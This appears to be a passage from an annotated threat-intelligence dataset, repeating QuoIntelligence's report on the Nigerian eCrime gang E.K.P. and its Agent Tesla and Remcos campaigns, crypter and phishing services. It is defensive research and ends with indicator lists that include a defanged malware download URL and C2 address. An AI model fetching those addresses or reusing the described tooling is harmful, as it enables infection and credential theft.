payloads, the threat actor used the online service known as Cassandra Crypter. ### Cassandra Crypter Service: Based on their website, Cassandra Crypter Service describes itself as: > > *A cloud crypter which is coded by the coder of PoisonCrypter, it will be updated daily twice or even thrice (if needed). As a result, it will be giving you a FUD result and always fud for the premium users. It is working with both native and managed assemblies (running since 2018)* > > > The customized obfuscation (e.g., ConfuserEx) of the .NET Agent Tesla payloads offered through Cassandra Crypter is available through two subscription plans: The Premium or VIP Plan. The Premium Plan can be paid directly and works automatically, while the VIP Plan requires the subscriber to contact support first for personalization. [![Screenshot of Cassandra Crypter Service ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service "") ![Screenshot of Cassandra Crypter Service ](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "")](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "") [![Screenshot of Cassandra Crypter Service Plan & Pricing](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ![Screenshot of Cassandra Crypter Service Plan & Pricing](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"")](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ##### Screenshots of the Cassandra Crypter Dashboard and the service’s pricing plans While E.K.P expedites the time spent preparing malware variants and malicious documents for the attack campaigns using different tools, they eventually get to the distribution part. Consequently, they will check with their manager again for the target details. E.K.P communicates with multiple contacts throughout the day and even uses *Sendspace* – a free hosting site for instant file transfers – to receive and transfer documents for campaigns. [![Screenshots of Sendspace ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots of Sendspace "") ![Screenshots of Sendspace ](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "")](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "") [![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P. ##### Screenshots of Sendspace and Turbomailer – both used by the Nigerian eCrime gang E.K.P. Another tool that E.K.P frequently uses for mass emails is the *Xleet Phishing Service*, a service popular amongst threat actors to distribute spear-phishing emails throughout various attacks. One of the services offered by the marketplace where Xleet is sold, is access to a compromised server that hosts the PHP web shell that enables ongoing access to the server. QuoIntelligence recently analyzed campaigns attributed to [top-tier threat actor “Cobalt” group](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/), using a PHP-mailer script placed on a likely compromised server used to distribute spear-phishing emails. The Raise of eCrime Toolset Services ------------------------------------ This investigation is an example of the effectiveness of the cybercriminal underground offering competent toolset services. Through Malware-as-a-Service (MaaS) and other subscription models, less-skilled individuals can execute low-effort cybercrime. A similar, slightly more complex MaaS often used by APTs is the Golden Chickens (GC) MaaS. Since 2018, QuoIntelligence has tracked and highlighted the [evolution of the Golden Chickens (GC)](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/) MaaS and how different actors use it, including top-tier threat actors FIN6, Cobalt, and Evilnum. By 2019, we uncovered [eleven tools attributed to the GC MaaS](https://quointelligence.eu/2021/04/golden-chickens-compilation/)and each customized per campaign for the threat actor purchasing the service. In general, attributing attack activity to threat actors leveraging a MaaS is often complicated. The services offered can include both C2 infrastructure and malware variants. These are available to all MaaS customers, whether script kiddies or Advanced Persistent Threat (APT) actors. E.K.P.: A Highly Active MaaS Provider Supporting Multiple Campaigns Simultaneously ---------------------------------------------------------------------------------- Our investigation uncovered E.K.P’s day-to-day operation over a couple of months. It became clear that the threat actor is highly active, supporting multiple campaigns in parallel, and leveraging complete and straightforward toolsets to monetize activity. E-Crime is a large ecosystem consisting of interconnected services, schemes, and affiliate networking in the cybercriminal domain. Overall, their primary goal is financial gain. QuoIntelligence will continue to observe threat actors like E.K.P, which are operating non-complex but effective eCrime services. Apendix ------- **Malicious document (maldoc)** * 7007f35df3292a4ecd741839fc2dafde471538041e54cfc24207d9f49016dc77 **Maldoc name** * Azerbaijan-Turky Military Negotiation.doc **Maldoc C2** * https://cannabispropertybrokers[.]com/pop/8OwWKrFQ0gQoKt9[.]exe **AgentTesla (delivered by maldoc)** * cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 **REMCOS RAT packed** * 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 **REMCOS RAT upacked** * 4d755262fd2c7f0539f919d300c7ebc3bd70267c002bcb8edd886a40e3f8ba75 **REMCOS RAT C2** * 79.134.225[.]72:64843 MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Initial Access** | [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) | | **Execution** | [T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002) | | **Persistance** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Privilege Escalation** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) [T1564.001: Hide Artifacts: Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001) [T1564.003: Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003) [T1562.001: Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) [T1112: Modify Registry](https://attack.mitre.org/techniques/T1112) [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555) [T1555.003: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1552.001: Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001) [T1552.002: Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002) | | **Discovery** | [T1087.001: Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001) [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560) [T1115: Clipboard Data](https://attack.mitre.org/techniques/T1115) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1185: Man in the Browser](https://attack.mitre.org/techniques/T1185) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113) [T1125: Video Capture](https://attack.mitre.org/techniques/T1125) | | **Command and Control (C2)** | [T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001) [T1071.003: Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003) [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) | | **Exfiltration** | [T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003) | [Get in touch!](https://quointelligence.eu/talk-to-an-expert/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-06-30_daily-operations-of-a-nigerian.txt,quoteintelligence_2021-06-30_daily-operations-of-a-nigerian,G0080,"E.K.P. & Agent Tesla: The Daily Operations of a Nigerian eCrime Gang Jun 30, 2021 In late 2020, QuoIntelligence identified a malicious Word document. The Word document contained technical indicators associated with an Agent Tesla malware campaign, a readily available Remote Access Trojan (RAT) that steals keystrokes and credentials. It ultimately led us to uncover the operation of a Nigerian eCrime gang. Based on our investigation, we dubbed the eCrime gang “E.K.P.”. Further, we understand that they are located in Nigeria. We also learned that E.K.P is an operator within a service model known as Malware-as-a-Service (MaaS). MaaS & RaaS: The All Skill-Level eCrime Conductors -------------------------------------------------- Cybercriminals are increasingly adopting MaaS for conventional malware campaigns and ransomware deployments (Ransomware-as-a-Service or short RaaS). Due to the offered capability and low barrier-to-entry, it doesn’t take a lot of skill to conduct attack campaigns. In this report, we highlight the daily operations of E.K.P and the various commodity tools used to both stage and execute attack campaigns. Uncovering E.K.P ---------------- The Microsoft Word document that we discovered in 2020 was entitled ”Azerbaijan-Turkey Military Negotiation.doc”. Apparently a user from a VirusTotal in the Netherlands containing a weaponized macro uploaded it. If the cyber attacker can successfully convince their target to open the document, the kill-chain will be launched, and the malware will be able to steal the information of the person who opened the file. [![Malicious Word document that E.K.P. used as attack lure](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Malicious Word document that E.K.P. used as attack lure"") ![Malicious Word document that E.K.P. used as attack lure](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"")](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"") [![Description and display of lure document](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Description and display of lure document"")![Description and display of lure document](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"")](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"") ##### Word document titled *Azerbaijan-Turkey Military Negotiations.doc* that E.K.P. used as lure for their recent attack E.K.P. Kill-Chain and Tesla Agent’s Connections to Other Malware Families ------------------------------------------------------------------------- The macro embedded with the Word document obfuscates, i.e., creates difficult-to-read code, to another simple obfuscated script. This script then tries to download and execute a payload retrieved from a Command and Control (C2) URL. Unfortunately, at the time of analysis, we could not retrieve the file. However, we determined additional files associated with the same C2 URL: a widespread malware family known as *Agent Tesla*. Agent Tesla is a readily available keylogger and Remote Access Trojan (RAT), written in .NET. Its primary function includes logging keystrokes and the clipboard to exfiltrate data ultimately. At least this specific variant attempts to exfiltrate data from the victim using hardcoded Simple Mail Transfer Protocol (SMTP) credentials for an attacker-controlled mailbox. Another malware family tied to the C2 Infrastructure is “Remcos RAT,” giving a cybercriminal complete control of an infected system. Its capabilities include keylogging and surveillance through audio and screenshots. Sir Pee and Day to Day Operations at eCrime gang E.K.P. ------------------------------------------------------- Based on what we have learned so far, we dubbed the cybercriminal gang E.K.P, and we understand that they are located in Nigeria. E.K.P. starts the day by communicating with customers and its management to determine the needed actions for the day. ![E.K.P.'s communication thread between group members, managers, and clients](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""E.K.P.'s communication thread"")![E.K.P.'s communication thread between group members, managers, and clients](https://quointelligence.eu/wp-content/uploads/2021/06/image3-1024x576.jpg ""E.K.P.'s communication thread"") ##### Screenshot of the conversation thread between E.K.P. members, their managers, and clients Based on other conversation threads, the contact with the moniker Sir Pee appears to be the manager of E.K.P. As you can see in the screenshot above, Sir Pee instructs E.K.P to “spam zip file now” and then sends the link to where the malicious file is uploaded. E.K.P responds with login credentials for an email account to the domain *loanabank[.]com*. The domain appears to be a fake bank page. Sir Pee, in turn, sends E.K.P credentials for a CPanel – a control dashboard to facilitate the management of a web hosting server. [![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of homepage of Ioanabank[.]com"") ![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Screenshot of homepage of Ioanabank[.]com"")](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using"") ##### Screenshot of Loanabank’s homepage – a fake bank domain E.K.P.’s multi-functional, multi-vendor attacker toolset -------------------------------------------------------- Our observations indicate clearly that E.K.P uses various malware builder kits, services, and inboxes for conducting their operations. After starting the day checking in with the apparent manager, E.K.P begins with their operational rounds by accessing their web shell on *predilletastore[.]com[.]br.* According to our research, the site is likely a compromised WordPress website hosting a web shell. E.K.P. uses this for attack operations and to control compromised hosts remotely. Further, the eCrime gang leverages it to store their attack tools such as payloads and files. [![E.K.P.'s web shell on predilletastore[.]com[.]br](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")![E.K.P.'s web shell on predilletastore[.]com[.]br](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br"")](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg ""E.K.P.'s web shell on predilletastore[.]com[.]br"") ##### Screenshot of predilletastore[.]com[.]br – E.K.P. web shell Based on their contact list, E.K.P seems to have access to a wide range of tools, especially if a potential customer requires capabilities outside the gang’s service catalog. However, during our observations, E.K.P heavily relied on mainly three core malware builder kits. ### Exploit Builder (version 1.5.0.1): A premium product requiring a license. Exploit Builder enables E.K.P to create an exploit document (e.g., Microsoft Word or Excel) that delivers a malware payload to a victim host. At first, the gang creates a payload using Origin Logger. Secondly, they obfuscate the payload with the Cassandra Crypter service. ### Origin Logger (also known as Agent Tesla): Through our analysis, we confirm that the payload generated by Origin Logger is nearly the same as previously decoded Agent Tesla payloads. The C2 panel interface matches the same panel that threat actors use for the malware Origin Logger, bundled with the C2 panel, and then sold to attackers. As the name suggests, its primary purpose is logging keystrokes, clipboard data, HTTP cookies, taking periodic screenshots, and viewing the webcam of infected computers. ![Screenshots showing Exploit Builder and Origin Logger](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots showing Exploit Builder and Origin Logger"") ![Screenshots showing Exploit Builder and Origin Logger](https://quointelligence.eu/wp-content/uploads/2021/06/image6-1024x561.jpg ""Screenshots showing Exploit Builder and Origin Logger"") ##### Screenshots showing Exploit Builder and Origin Logger E.K.P leveraged the Origin Logger builder to create multiple variants to infect victims. For obfuscation of the payloads, the threat actor used the online service known as Cassandra Crypter. ### Cassandra Crypter Service: Based on their website, Cassandra Crypter Service describes itself as: > > *A cloud crypter which is coded by the coder of PoisonCrypter, it will be updated daily twice or even thrice (if needed). As a result, it will be giving you a FUD result and always fud for the premium users. It is working with both native and managed assemblies (running since 2018)* > > > The customized obfuscation (e.g., ConfuserEx) of the .NET Agent Tesla payloads offered through Cassandra Crypter is available through two subscription plans: The Premium or VIP Plan. The Premium Plan can be paid directly and works automatically, while the VIP Plan requires the subscriber to contact support first for personalization. [![Screenshot of Cassandra Crypter Service ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service "") ![Screenshot of Cassandra Crypter Service ](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "")](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg ""Screenshot of Cassandra Crypter Service "") [![Screenshot of Cassandra Crypter Service Plan & Pricing](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ![Screenshot of Cassandra Crypter Service Plan & Pricing](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"")](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg ""Screenshot of Cassandra Crypter Service Plan & Pricing"") ##### Screenshots of the Cassandra Crypter Dashboard and the service’s pricing plans While E.K.P expedites the time spent preparing malware variants and malicious documents for the attack campaigns using different tools, they eventually get to the distribution part. Consequently, they will check with their manager again for the target details. E.K.P communicates with multiple contacts throughout the day and even uses *Sendspace* – a free hosting site for instant file transfers – to receive and transfer documents for campaigns. [![Screenshots of Sendspace ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots of Sendspace "") ![Screenshots of Sendspace ](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "")](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg ""Screenshots of Sendspace "") [![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")![Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P.](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – used by the Nigerian eCrime gang E.K.P."")](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg ""Screenshots Turbomailer – both used by the Nigerian eCrime gang E.K.P. ##### Screenshots of Sendspace and Turbomailer – both used by the Nigerian eCrime gang E.K.P. Another tool that E.K.P frequently uses for mass emails is the *Xleet Phishing Service*, a service popular amongst threat actors to distribute spear-phishing emails throughout various attacks. One of the services offered by the marketplace where Xleet is sold, is access to a compromised server that hosts the PHP web shell that enables ongoing access to the server. QuoIntelligence recently analyzed campaigns attributed to [top-tier threat actor “Cobalt” group](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/), using a PHP-mailer script placed on a likely compromised server used to distribute spear-phishing emails. The Raise of eCrime Toolset Services ------------------------------------ This investigation is an example of the effectiveness of the cybercriminal underground offering competent toolset services. Through Malware-as-a-Service (MaaS) and other subscription models, less-skilled individuals can execute low-effort cybercrime. A similar, slightly more complex MaaS often used by APTs is the Golden Chickens (GC) MaaS. Since 2018, QuoIntelligence has tracked and highlighted the [evolution of the Golden Chickens (GC)](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/) MaaS and how different actors use it, including top-tier threat actors FIN6, Cobalt, and Evilnum. By 2019, we uncovered [eleven tools attributed to the GC MaaS](https://quointelligence.eu/2021/04/golden-chickens-compilation/)and each customized per campaign for the threat actor purchasing the service. In general, attributing attack activity to threat actors leveraging a MaaS is often complicated. The services offered can include both C2 infrastructure and malware variants. These are available to all MaaS customers, whether script kiddies or Advanced Persistent Threat (APT) actors. E.K.P.: A Highly Active MaaS Provider Supporting Multiple Campaigns Simultaneously ---------------------------------------------------------------------------------- Our investigation uncovered E.K.P’s day-to-day operation over a couple of months. It became clear that the threat actor is highly active, supporting multiple campaigns in parallel, and leveraging complete and straightforward toolsets to monetize activity. E-Crime is a large ecosystem consisting of interconnected services, schemes, and affiliate networking in the cybercriminal domain. Overall, their primary goal is financial gain. QuoIntelligence will continue to observe threat actors like E.K.P, which are operating non-complex but effective eCrime services. Apendix ------- **Malicious document (maldoc)** * 7007f35df3292a4ecd741839fc2dafde471538041e54cfc24207d9f49016dc77 **Maldoc name** * Azerbaijan-Turky Military Negotiation.doc **Maldoc C2** * https://cannabispropertybrokers[.]com/pop/8OwWKrFQ0gQoKt9[.]exe **AgentTesla (delivered by maldoc)** * cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 **REMCOS RAT packed** * 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 **REMCOS RAT upacked** * 4d755262fd2c7f0539f919d300c7ebc3bd70267c002bcb8edd886a40e3f8ba75 **REMCOS RAT C2** * 79.134.225[.]72:64843 MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Initial Access** | [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) | | **Execution** | [T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002) | | **Persistance** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Privilege Escalation** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) | | **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) [T1564.001: Hide Artifacts: Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001) [T1564.003: Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003) [T1562.001: Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) [T1112: Modify Registry](https://attack.mitre.org/techniques/T1112) [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) [T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) [T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555) [T1555.003: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1552.001: Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001) [T1552.002: Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002) | | **Discovery** | [T1087.001: Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001) [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057) [T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) | | **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560) [T1115: Clipboard Data](https://attack.mitre.org/techniques/T1115) [T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001) [T1185: Man in the Browser](https://attack.mitre.org/techniques/T1185) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113) [T1125: Video Capture](https://attack.mitre.org/techniques/T1125) | | **Command and Control (C2)** | [T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001) [T1071.003: Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003) [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) | | **Exfiltration** | [T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003) | [Get in touch!](https://quointelligence.eu/talk-to-an-expert/)"
annoctr,annoctr/AnnoCTR/text/test/quoteintelligence_2021-06-30_daily-operations-of-a-nigerian.txt,quoteintelligence_2021-06-30_daily-operations-of-a-nigerian,G0120,"E.K.P. & Agent Tesla: The Daily Operations of a Nigerian eCrime Gang Jun 30, 2021 In late 2020, QuoIntelligence identified a malicious Word document. The Word document contained technical indicators associated with an Agent Tesla malware campaign, a readily available Remote Access Trojan (RAT) that steals keystrokes and credentials. It ultimately led us to uncover the operation of a Nigerian eCrime gang. Based on our investigation, we dubbed the eCrime gang “E.K.P.”. Further, we understand that they are located in Nigeria. We also learned that E.K.P is an operator within a service model known as Malware-as-a-Service (MaaS). MaaS & RaaS: The All Skill-Level eCrime Conductors -------------------------------------------------- Cybercriminals are increasingly adopting MaaS for conventional malware campaigns and ransomware deployments (Ransomware-as-a-Service or short RaaS). Due to the offered capability and low barrier-to-entry, it doesn’t take a lot of skill to conduct attack campaigns. In this report, we highlight the daily operations of E.K.P and the various commodity tools used to both stage and execute attack campaigns. Uncovering E.K.P ---------------- The Microsoft Word document that we discovered in 2020 was entitled ”Azerbaijan-Turkey Military Negotiation.doc”. Apparently a user from a VirusTotal in the Netherlands containing a weaponized macro uploaded it. If the cyber attacker can successfully convince their target to open the document, the kill-chain will be launched, and the malware will be able to steal the information of the person who opened the file. [![Malicious Word document that E.K.P. used as attack lure](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Malicious Word document that E.K.P. used as attack lure"") ![Malicious Word document that E.K.P. used as attack lure](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"")](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg ""Malicious Word document that E.K.P. used as attack lure"") [![Description and display of lure document](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Description and display of lure document"")![Description and display of lure document](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"")](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg ""Description and display of lure document"") ##### Word document titled *Azerbaijan-Turkey Military Negotiations.doc* that E.K.P. used as lure for their recent attack E.K.P. Kill-Chain and Tesla Agent’s Connections to Other Malware Families ------------------------------------------------------------------------- The macro embedded with the Word document obfuscates, i.e., creates difficult-to-read code, to another simple obfuscated script. This script then tries to download and execute a payload retrieved from a Command and Control (C2) URL. Unfortunately, at the time of analysis, we could not retrieve the file. However, we determined additional files associated with the same C2 URL: a widespread malware family known as *Agent Tesla*. Agent Tesla is a readily available keylogger and Remote Access Trojan (RAT), written in .NET. Its primary function includes logging keystrokes and the clipboard to exfiltrate data ultimately. At least this specific variant attempts to exfiltrate data from the victim using hardcoded Simple Mail Transfer Protocol (SMTP) credentials for an attacker-controlled mailbox. Another malware family tied to the C2 Infrastructure is “Remcos RAT,” giving a cybercriminal complete control of an infected system. Its capabilities include keylogging and surveillance through audio and screenshots. Sir Pee and Day to Day Operations at eCrime gang E.K.P. ------------------------------------------------------- Based on what we have learned so far, we dubbed the cybercriminal gang E.K.P, and we understand that they are located in Nigeria. E.K.P. starts the day by communicating with customers and its management to determine the needed actions for the day. ![E.K.P.'s communication thread between group members, managers, and clients](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""E.K.P.'s communication thread"")![E.K.P.'s communication thread between group members, managers, and clients](https://quointelligence.eu/wp-content/uploads/2021/06/image3-1024x576.jpg ""E.K.P.'s communication thread"") ##### Screenshot of the conversation thread between E.K.P. members, their managers, and clients Based on other conversation threads, the contact with the moniker Sir Pee appears to be the manager of E.K.P. As you can see in the screenshot above, Sir Pee instructs E.K.P to “spam zip file now” and then sends the link to where the malicious file is uploaded. E.K.P responds with login credentials for an email account to the domain *loanabank[.]com*. The domain appears to be a fake bank page. Sir Pee, in turn, sends E.K.P credentials for a CPanel – a control dashboard to facilitate the management of a web hosting server. [![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Screenshot of homepage of Ioanabank[.]com"") ![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Screenshot of homepage of Ioanabank[.]com"")](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg ""Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using"") ##### Screenshot of Loanabank’s homepage – a fake bank domain E.K.P.’s multi-functional, multi-vendor attacker toolset -------------------------------------------------------- Our observations indicate clearly that E.K.P uses 